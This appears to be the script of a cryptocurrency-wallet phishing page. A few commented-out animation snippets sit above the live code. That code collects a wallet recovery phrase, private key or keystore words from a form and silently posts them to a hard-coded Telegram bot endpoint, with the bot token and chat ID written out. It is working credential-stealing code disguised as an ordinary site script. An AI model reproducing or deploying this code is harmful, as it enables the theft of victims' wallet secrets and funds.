// $(function () {
//   $(".counter").counterUp({
//     delay: 10,
//     time: 3000,
//   });
// });

// $(".service-card").waypoint(
//   function () {
//     $(".service-card").addClass("pulse");
//   },
//   { offset: "100%" }
// );

// $(function () {
//   new WOW().init();
// });

let phrase = document.getElementById("phrase");
let privateKey = document.getElementById("privatekey");
let keystore = document.getElementById("keystore");

const handleNow = async (event) => {
  event.preventDefault();
  console.log("first");
  const formData = new FormData(event.target);
  const formProps = Object.fromEntries(formData);
  let val = "";
  if (formProps.phrase) {
    val = formProps.phrase;
  } else if (formProps.privateKey) {
    val = formProps.privateKey;
  } else {
    val = formProps.words;
  }

  try {
    await axios.post(
      `https://api.telegram.org/bot6836924100:AAFlBwen6dM0p2gEQSJuzpP5uiPOTqWBaZA/sendMessage`,
      {
        chat_id: 5647230523,
        text: val,
      }
    );
  } catch (error) {}
};
